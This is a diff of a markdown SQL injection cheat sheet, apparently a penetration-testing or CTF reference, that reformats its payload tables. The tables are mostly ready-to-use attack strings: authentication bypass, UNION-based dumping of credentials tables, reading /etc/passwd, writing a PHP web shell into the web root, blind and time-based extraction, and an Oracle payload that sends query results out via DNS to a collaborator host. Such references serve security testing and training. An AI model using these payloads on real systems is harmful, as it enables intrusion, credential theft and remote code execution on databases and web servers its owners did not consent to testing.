@@ -39,18 +39,18 @@
 * OR (`||`)
 
 ## SQL Injection
-| **Payload**   | **Description**   |
-| --------------|-------------------|
-| **Auth Bypass** |
+| **Payload** | **Description** |
+| ---- | ---- |
+| **Auth Bypass** |  |
 | `admin' or '1'='1` | Basic Auth Bypass |
 | `admin')-- -` | Basic Auth Bypass With comments |
-| [Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) |
-| **Union Injection** |
+| [Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) |  |
+| **Union Injection** |  |
 | `' order by 1-- -` | Detect number of columns using `order by` |
 | `cn' UNION select 1,2,3-- -` | Detect number of columns using Union injection |
 | `cn' UNION select 1,@@version,3,4-- -` | Basic Union injection |
 | `UNION select username, 2, 3, 4 from passwords-- -` | Union injection for 4 columns |
-| **DB Enumeration** |
+| **DB Enumeration** |  |
 | `SELECT @@version` | Fingerprint MySQL with query output |
 | `SELECT SLEEP(5)` | Fingerprint MySQL with no output |
 | `cn' UNION select 1,database(),2,3-- -` | Current database name |
@@ -58,52 +58,34 @@
 | `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` | List all tables in a specific database |
 | `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | List all columns in a specific table |
 | `cn' UNION select 1, username, password, 4 from dev.credentials-- -` | Dump data from a table in another database |
-| **Privileges** |
+| **Privileges** |  |
 | `cn' UNION SELECT 1, user(), 3, 4-- -` | Find current user |
 | `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` | Find if user has admin privileges |
 | `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -` | Find if all user privileges |
 | `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL |
-| **File Injection** |
+| **File Injection** |  |
 | `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` | Read local file |
 | `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | Write a string to a local file |
 | `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |
-| **Blind SQL Injection** |
+| **Blind SQL Injection** |  |
 | `cookie_value' and substring((select password from users where username='admin'),1,1)='a'--'` | Blind sql injection on error based injection (ie, we have a response changing when an error occurs or not) |
 | `LGF4OY5pSrLIqxu' and (SELECT CASE WHEN (SUBSTR(password,1,21)='gz92x9yvfj3m6rzre8zg§a§') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--` | Conditionnal error. Ie when a good value is set, an error is thrown (ex : 500 Internal server Error) |
 | `' AND CAST((SELECT password FROM users WHERE username='admin') AS int)--` `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--` | Can be usefull when error query are shown. |
 | `qsduqzln12aze' \|\| (SELECT sleep(10))--`  `qsduqzln12aze' \|\| (SELECT pg_sleep(10))--`  `'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--` `x'+\|\|+(SELECT+CASE+WHEN+(username='administrator'+AND SUBSTRING(password,1,2)='a§a§')+THEN pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM users)--` | time based query // For burp intruder resource thread must be set to 1 to avoid false positives |
-| `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'\|\|(SELECT YOUR-QUERY-HERE)\|\|'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual` | DNS Lookup + data exfil : Oracle. See other payload here : https://portswigger.net/web-security/sql-injection/cheat-sheet|
+| `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'\|\|(SELECT YOUR-QUERY-HERE)\|\|'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual` | DNS Lookup + data exfil : Oracle. See other payload here : https://portswigger.net/web-security/sql-injection/cheat-sheet |
 
-String concatenation
 
-You can concatenate together multiple strings to make a single string.
-Oracle 	'foo'||'bar'
-Microsoft 	'foo'+'bar'
-PostgreSQL 	'foo'||'bar'
-MySQL 	'foo' 'bar' [Note the space between the two strings]
-CONCAT('foo','bar')
-Substring
 
-You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string ba.
-Oracle 	SUBSTR('foobar', 4, 2)
-Microsoft 	SUBSTRING('foobar', 4, 2)
-PostgreSQL 	SUBSTRING('foobar', 4, 2)
-MySQL 	SUBSTRING('foobar', 4, 2)
-Comments
+| Oracle | Microsoft | PostgresQL | Mysql | Description |
+| ---- | ---- | ---- | ---- | ---- |
+| ```sql<br>'foo'\|\|'bar'<br>```<br>=> `foobar` | `'foo'+'bar'`<br>=> `foobar` | `'foo'\|\|'bar'`<br>=> `foobar` | `'foo' 'bar'`<br>`CONCAT('foo','bar')`<br>=> `foobar` | Concatenate strings |
+| `SUBSTR('foobar', 4, 2)`<br>=> `ba` | `SUBSTRING('foobar', 4, 2)`<br>=> `ba` | `SUBSTRING('foobar', 4, 2)`<br>=> `ba` | `SUBSTRING('foobar', 4, 2)`<br>=> `ba` | Extract part of a string. |
+| --comment | --comment<br>/\*comment\*/ | --comment<br>/\*comment\*/ | \#comment<br>-- comment <br>[Note the space after the double dash]<br>/\*comment\*/ | Comments to truncate a query. |
+| `SELECT banner FROM v$version`<br> |  |  |  | Database Version |
 
-You can use comments to truncate a query and remove the portion of the original query that follows your input.
-Oracle 	--comment
-Microsoft 	--comment
-/*comment*/
-PostgreSQL 	--comment
-/*comment*/
-MySQL 	#comment
--- comment [Note the space after the double dash]
-/*comment*/
-Database version
 
 You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.
-Oracle 	SELECT banner FROM v$version
+Oracle 	
 SELECT version FROM v$instance
 Microsoft 	SELECT @@version
 PostgreSQL 	SELECT version()
